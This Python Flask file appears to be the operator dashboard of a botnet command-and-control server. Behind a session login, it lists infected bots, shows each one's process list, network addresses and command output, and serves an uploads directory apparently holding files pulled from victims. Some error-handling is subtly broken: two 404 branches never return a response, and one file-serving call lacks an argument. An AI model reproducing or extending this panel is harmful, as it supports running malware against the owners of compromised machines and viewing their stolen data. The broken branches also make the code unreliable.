import sqlite3 as sql
from flask import send_from_directory
from flask import g
from flask import request
from flask import render_template
from flask import redirect, url_for
from flask import session

from c2.database import get_bot_record as db
from c2 import app
import os


def get_db() -> sql.Connection:
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sql.connect(app.config['DB_NAME'])
    return db


@app.route('/')
@app.route('/index')
@app.route('/home')
def index():
    conn = get_db()
    bot_count = db.get_bot_count(conn)
    user_count = db.get_user_count(conn)
    return render_template('index.html', bot_count=bot_count, user_count=user_count)


@app.route('/favicon.ico')
def favicon():
    return send_from_directory("static", 'favicon.ico', mimetype='image/png')


@app.route('/bots', methods=['GET'])
def bots():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('bots.html', bot_list = db.get_all_bot_ids_and_networking(conn))


@app.route('/bot/<id>', methods=['GET'])
def bot(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()

        return render_template('bot.html', id = id, bot_data = db.bot_tostringlist(conn, id))


@app.route('/bot/<id>/proclist', methods=['GET'])
def proclist(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('botproclist.html', id = id, bot_data = db.bot_pstostring(conn, id))


@app.route('/bot/<id>/networkaddresses', methods=['GET'])
def networkaddresses(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('botnetworkaddresslist.html', id=id, bot_data=db.bot_nwaddrtostring(conn, id))


@app.route('/bot/<id>/commandoutput', methods=['GET'])
def commandoutput(id):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
        conn = get_db()
        return render_template('botcommandout.html', id=id, bot_data=db.bot_cmdouttostring(conn, id))


@app.route('/uploads', methods=['GET'])
def uploads_main():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
            abs_path = os.path.join(app.config['UPLOAD_FOLDER'])
            if not os.path.exists(abs_path):
                render_template('page_not_found.html'), 404
            if os.path.isfile(abs_path):
                return send_from_directory(app.config['UPLOAD_FOLDER'])
            files = os.listdir(abs_path)
            return render_template('uploads.html', files=files)


@app.route('/uploads/<path:req_path>', methods=['GET'])
def uploads(req_path):
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'GET':
            abs_path = os.path.join(app.config['UPLOAD_FOLDER'], req_path)
            if not os.path.exists(abs_path):
                render_template('page_not_found.html'), 404
            if os.path.isfile(abs_path):
                return send_from_directory(app.config['UPLOAD_FOLDER'], req_path)
                #return send_file(abs_path)
            # Show directory contents
            files = os.listdir(abs_path)
            return render_template('uploads.html', files=files)



@app.errorhandler(404)
def page_not_found(error):
    return render_template('page_not_found.html'), 404


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()
